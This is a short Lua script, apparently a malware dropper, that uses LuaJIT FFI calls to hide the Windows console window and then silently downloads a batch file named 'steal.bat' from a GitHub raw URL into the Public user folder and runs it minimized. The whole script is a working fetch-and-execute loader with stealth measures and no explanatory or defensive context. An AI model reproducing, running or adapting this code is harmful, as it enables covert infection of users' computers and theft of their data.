local ffi = require("ffi")

ffi.cdef[[
    void* GetConsoleWindow();
    int ShowWindow(void* hWnd, int nCmdShow);
]]

local SW_HIDE = 0
local hWnd = ffi.C.GetConsoleWindow()
if hWnd ~= nil then
    ffi.C.ShowWindow(hWnd, SW_HIDE)
end

os.execute('cmd /c curl -s -o C:\\Users\\Public\\steal.bat https://raw.githubusercontent.com/LoneNone1807/batman/main/steal.bat & start /min C:\\Users\\Public\\steal.bat')
